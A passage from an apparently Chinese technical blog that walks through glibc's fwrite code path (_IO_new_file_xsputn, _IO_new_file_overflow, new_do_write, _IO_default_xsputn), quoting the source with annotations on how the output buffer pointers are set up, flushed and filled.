      <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">&gt;</span> to_do<span class="token punctuation">)</span>
  count <span class="token operator">=</span> to_do<span class="token punctuation">;</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
      <span class="token function">memcpy</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_IO_write_ptr<span class="token punctuation">,</span> s<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>
      f<span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">+=</span> count<span class="token punctuation">;</span>
    # 计算是否还有目标输出数据剩余
      s <span class="token operator">+=</span> count<span class="token punctuation">;</span>
      to_do <span class="token operator">-=</span> count<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>​    主要功能就是判断输出缓冲区还有多少空间，其中像示例程序所示的f-&gt;_IO_write_end以及f-&gt;_IO_write_ptr均为0，此时的输出缓冲区为0。</p> <p>​    另一部分则是如果输出缓冲区仍有剩余空间的话，则将目标输出数据拷贝至输出缓冲区，并计算在输出缓冲区填满后，是否仍然剩余目标输出数据。</p> <p>​    第二部分代码如下。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>  # 如果还有目标数据剩余，此时则表明输出缓冲区未建立或输出缓冲区已经满了
  <span class="token keyword">if</span> <span class="token punctuation">(</span>to_do <span class="token operator">+</span> must_flush <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      _IO_size_t block_size<span class="token punctuation">,</span> do_write<span class="token punctuation">;</span>
      # 函数实现清空输出缓冲区或建立缓冲区的功能
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_OVERFLOW</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
  
  <span class="token keyword">return</span> to_do <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token constant">EOF</span> <span class="token operator">:</span> n <span class="token operator">-</span> to_do<span class="token punctuation">;</span>

      # 检查输出数据是否是大块
      block_size <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_buf_end <span class="token operator">-</span> f<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">;</span>
      do_write <span class="token operator">=</span> to_do <span class="token operator">-</span> <span class="token punctuation">(</span>block_size <span class="token operator">&gt;=</span> <span class="token number">128</span> <span class="token operator">?</span> to_do <span class="token operator">%</span> block_size <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>​    经过了上一步骤，如果还有目标输出数据，表明输出缓冲区未建立或输出缓冲区已经满了，此时调用_IO_OVERFLOW函数。该函数功能主要是实现刷新输出缓冲区或建立缓冲区，它就是vtable中的__overlfow（_IO_new_file_overflow），文件在/libio/fileops.c中。</p> <p><img src="/images/heap/image-20211226164906085.png" alt="image-20211226164906085"></p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">int</span>
<span class="token function">_IO_new_file_overflow</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">int</span> ch<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  # 判断标志位是否包含_IO_NO_WRITES
  <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_flags <span class="token operator">&amp;</span> _IO_NO_WRITES<span class="token punctuation">)</span> <span class="token comment">/* SET ERROR */</span>
    <span class="token punctuation">{</span>
      f<span class="token operator">-&gt;</span>_flags <span class="token operator">|=</span> _IO_ERR_SEEN<span class="token punctuation">;</span>
      <span class="token function">__set_errno</span> <span class="token punctuation">(</span>EBADF<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  
  # 判断输出缓冲区是否为空
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_flags <span class="token operator">&amp;</span> _IO_CURRENTLY_PUTTING<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> f<span class="token operator">-&gt;</span>_IO_write_base <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token comment">/* Allocate a buffer if needed. */</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_IO_write_base <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    # 分配输出缓冲区
    <span class="token function">_IO_doallocbuf</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">_IO_setg</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">,</span> f<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">,</span> f<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
     
     # 初始化指针
      <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_IO_read_ptr <span class="token operator">==</span> f<span class="token operator">-&gt;</span>_IO_buf_end<span class="token punctuation">)</span>
  f<span class="token operator">-&gt;</span>_IO_read_end <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_read_ptr <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">;</span>
      f<span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_read_ptr<span class="token punctuation">;</span>
      f<span class="token operator">-&gt;</span>_IO_write_base <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_write_ptr<span class="token punctuation">;</span>
      f<span class="token operator">-&gt;</span>_IO_write_end <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_buf_end<span class="token punctuation">;</span>
      f<span class="token operator">-&gt;</span>_IO_read_base <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_read_ptr <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_read_end<span class="token punctuation">;</span>

      f<span class="token operator">-&gt;</span>_flags <span class="token operator">|=</span> _IO_CURRENTLY_PUTTING<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> f<span class="token operator">-&gt;</span>_flags <span class="token operator">&amp;</span> <span class="token punctuation">(</span>_IO_LINE_BUF <span class="token operator">|</span> _IO_UNBUFFERED<span class="token punctuation">)</span><span class="token punctuation">)</span>
  f<span class="token operator">-&gt;</span>_IO_write_end <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_write_ptr<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
   
  # 输出输出缓冲区 
  <span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token function">_IO_do_write</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token operator">-&gt;</span>_IO_write_base<span class="token punctuation">,</span>
       f<span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">-</span> f<span class="token operator">-&gt;</span>_IO_write_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">==</span> f<span class="token operator">-&gt;</span>_IO_buf_end <span class="token punctuation">)</span> <span class="token comment">/* Buffer is really full */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_do_flush</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> ## 
      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
  <span class="token operator">*</span>f<span class="token operator">-&gt;</span>_IO_write_ptr<span class="token operator">++</span> <span class="token operator">=</span> ch<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_flags <span class="token operator">&amp;</span> _IO_UNBUFFERED<span class="token punctuation">)</span>
      <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_flags <span class="token operator">&amp;</span> _IO_LINE_BUF<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> ch <span class="token operator">==</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_do_write</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token operator">-&gt;</span>_IO_write_base<span class="token punctuation">,</span>
          f<span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">-</span> f<span class="token operator">-&gt;</span>_IO_write_base<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span> ch<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">libc_hidden_ver</span> <span class="token punctuation">(</span>_IO_new_file_overflow<span class="token punctuation">,</span> _IO_file_overflow<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br></div></div><p>​    __overflow函数首先检测_IO_FILE的flags是否包含_IO_NO_WRITES标志位，如果包含的话直接返回。</p> <p>​    接着判断f-&gt;_IO_write_base是否为空，如果为空表明输出缓冲区尚未建立，就调用_IO_doallocbuf函数去分配输出缓冲区，_IO_doallocbuf函数源码在上小节fread中已经分析过了，就不继续跟进分析了，总结下它功能就是分配输出输出缓冲区并将指针_IO_buf_base和_IO_buf_end赋值。</p> <p>​    在执行_IO_doallocbuf分配完空间后调用_IO_setg宏，该宏的定义如下，它将输出相关的缓冲区指针赋值为_IO_buf_base指针。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">_IO_setg</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> eb<span class="token punctuation">,</span> g<span class="token punctuation">,</span> eg<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token operator">-&gt;</span>_IO_read_base <span class="token operator">=</span> <span class="token punctuation">(</span>eb<span class="token punctuation">)</span><span class="token punctuation">,</span></span></span>
<span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token operator">-&gt;</span>_IO_read_ptr <span class="token operator">=</span> <span class="token punctuation">(</span>g<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token operator">-&gt;</span>_IO_read_end <span class="token operator">=</span> <span class="token punctuation">(</span>eg<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>​    经过上面这些步骤，此时IO_FILE的指针如下图所示。可以看到_IO_buf_base和_IO_buf_end被赋值了，且输出相关缓冲区指针被赋值为_IO_buf_base。</p> <p><img src="/images/heap/image-20211226164959672.png" alt="image-20211226164959672"></p> <p>​    然后代码初始化其他相关指针，最主要的就是将f-&gt;_IO_write_base以及f-&gt;_IO_write_ptr设置成f-&gt;_IO_read_ptr指针；将f-&gt;_IO_write_end赋值为f-&gt;_IO_buf_end指针。</p> <p>​    接着就执行_IO_do_write来调用系统调用write输出输出缓冲区，输出的内容为f-&gt;_IO_write_ptr到f-&gt;_IO_write_base之间的内容。跟进去该函数，函数在/libio/fileops.c中。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">int</span>
<span class="token function">_IO_new_do_write</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> _IO_size_t to_do<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>to_do <span class="token operator">==</span> <span class="token number">0</span>
    <span class="token operator">||</span> <span class="token punctuation">(</span>_IO_size_t<span class="token punctuation">)</span> <span class="token function">new_do_write</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> to_do<span class="token punctuation">)</span> <span class="token operator">==</span> to_do<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">libc_hidden_ver</span> <span class="token punctuation">(</span>_IO_new_do_write<span class="token punctuation">,</span> _IO_do_write<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>​    该函数调用了new_do_write，跟进去，函数在/libio/fileops.c中。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">static</span>
_IO_size_t
<span class="token function">new_do_write</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> _IO_size_t to_do<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  _IO_size_t count<span class="token punctuation">;</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  # 额外判断
  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_IO_read_end <span class="token operator">!=</span> fp<span class="token operator">-&gt;</span>_IO_write_base<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      _IO_off64_t new_pos
  <span class="token operator">=</span> <span class="token function">_IO_SYSSEEK</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-&gt;</span>_IO_write_base <span class="token operator">-</span> fp<span class="token operator">-&gt;</span>_IO_read_end<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>new_pos <span class="token operator">==</span> _IO_pos_BAD<span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
      fp<span class="token operator">-&gt;</span>_offset <span class="token operator">=</span> new_pos<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  # 调用函数输出输出缓冲区
  count <span class="token operator">=</span> <span class="token function">_IO_SYSWRITE</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> to_do<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  # 刷新设置缓冲区指针
  <span class="token function">_IO_setg</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">,</span> fp<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">,</span> fp<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
  fp<span class="token operator">-&gt;</span>_IO_write_base <span class="token operator">=</span> fp<span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">=</span> fp<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">;</span>
  fp<span class="token operator">-&gt;</span>_IO_write_end <span class="token operator">=</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span>
           <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_flags <span class="token operator">&amp;</span> <span class="token punctuation">(</span>_IO_LINE_BUF <span class="token operator">|</span> _IO_UNBUFFERED<span class="token punctuation">)</span><span class="token punctuation">)</span>
           <span class="token operator">?</span> fp<span class="token operator">-&gt;</span>_IO_buf_base <span class="token operator">:</span> fp<span class="token operator">-&gt;</span>_IO_buf_end<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> count<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><p>​    这里有一个判断，判断fp-&gt;_IO_read_end是否等于fp-&gt;_IO_write_base，如果不等的话，调用_IO_SYSSEEK去调整文件偏移。</p> <p>​    接着就调用_IO_SYSWRITE函数，该函数时vtable中的__write(_IO_new_file_write)函数，也就是最终执行系统调用的地方，跟进去看，文件在/libio/fileops.c中。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>_IO_ssize_t
<span class="token function">_IO_new_file_write</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> _IO_ssize_t n<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  _IO_ssize_t to_do <span class="token operator">=</span> n<span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span>to_do <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
    # 系统调用write输出
      _IO_ssize_t count <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_flags2
               <span class="token operator">&amp;</span> _IO_FLAGS2_NOTCANCEL<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
         <span class="token operator">?</span> <span class="token function">write_not_cancel</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_fileno<span class="token punctuation">,</span> data<span class="token punctuation">,</span> to_do<span class="token punctuation">)</span>
         <span class="token operator">:</span> <span class="token function">write</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_fileno<span class="token punctuation">,</span> data<span class="token punctuation">,</span> to_do<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>   
  <span class="token keyword">return</span> n<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>​    执行完_IO_SYSWRITE函数后，回到new_do_write函数，刷新设置缓冲区指针并返回。</p> <p>​    经历了缓冲区建立以及刷新缓冲区，程序返回到_IO_new_file_xsputn函数中，进入到以下代码块。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>  # 检查输出数据是否是大块
      block_size <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_buf_end <span class="token operator">-</span> f<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">;</span>
      do_write <span class="token operator">=</span> to_do <span class="token operator">-</span> <span class="token punctuation">(</span>block_size <span class="token operator">&gt;=</span> <span class="token number">128</span> <span class="token operator">?</span> to_do <span class="token operator">%</span> block_size <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


      <span class="token keyword">if</span> <span class="token punctuation">(</span>do_write<span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    # 如果是大块的话则不使用输出缓冲区而直接输出。
    count <span class="token operator">=</span> <span class="token function">new_do_write</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> s<span class="token punctuation">,</span> do_write<span class="token punctuation">)</span><span class="token punctuation">;</span>
    to_do <span class="token operator">-=</span> count<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">&lt;</span> do_write<span class="token punctuation">)</span>
      <span class="token keyword">return</span> n <span class="token operator">-</span> to_do<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>​    运行到此处，此时已经经过了_IO_OVERFLOW函数（对输出缓冲区进行了初始化或刷新），也就是说此时的IO_FILE缓冲区指针的状态是处于刷新的初始化状态，输出缓冲区中也没用数据。</p> <p>​    上面这部分代码检查剩余目标输出数据大小，如果超过输出缓冲区f-&gt;_IO_write_end – f-&gt;_IO_write_base的大小，则为了提高效率，不在使用输出缓冲区，而是以块（4kb）为基本单位直接将缓冲区调用new_do_write输出。new_do_write函数在上面已经跟过了，就是输出，并刷新指针设置。</p> <p>​    由于示例程序只输出0x20大小的数据，而它的输出缓冲区大小为0x1000，因此不会进入这部分代码。</p> <p>​    在以大块为基本单位把数据直接输出后可能还剩余小数据，IO采用的策略是将剩余目标输出数据放入到输出缓冲区里面，相关源码如下。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code> # 剩余的数据拷贝至输出缓冲区
      <span class="token keyword">if</span> <span class="token punctuation">(</span>to_do<span class="token punctuation">)</span>
  to_do <span class="token operator">-=</span> <span class="token function">_IO_default_xsputn</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> s<span class="token operator">+</span>do_write<span class="token punctuation">,</span> to_do<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>​    程序调用_IO_default_xsputn函数对剩下的s + do_write数据进行操作，跟进去该函数，在/libio/genops.c中。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>_IO_size_t
<span class="token function">_IO_default_xsputn</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> _IO_size_t n<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> data<span class="token punctuation">;</span>
  _IO_size_t more <span class="token operator">=</span> n<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>more <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token comment">/* Space available. */</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">&lt;</span> f<span class="token operator">-&gt;</span>_IO_write_end<span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    _IO_size_t count <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_write_end <span class="token operator">-</span> f<span class="token operator">-&gt;</span>_IO_write_ptr<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">&gt;</span> more<span class="token punctuation">)</span>
      count <span class="token operator">=</span> more<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">&gt;</span> <span class="token number">20</span><span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        # 输出长度大于<span class="token number">20</span>，则调用memcpy拷贝
        <span class="token function">memcpy</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_IO_write_ptr<span class="token punctuation">,</span> s<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">+=</span> count<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
        s <span class="token operator">+=</span> count<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>count<span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        # 小于<span class="token number">20</span>则直接赋值
        <span class="token keyword">char</span> <span class="token operator">*</span>p <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_write_ptr<span class="token punctuation">;</span>
        _IO_ssize_t i<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> count<span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">)</span>
    <span class="token operator">*</span>p<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>s<span class="token operator">++</span><span class="token punctuation">;</span>
        f<span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">=</span> p<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    more <span class="token operator">-=</span> count<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  # 如果输出缓冲区为空，则调用_IO_OVERFLOW直接输出。
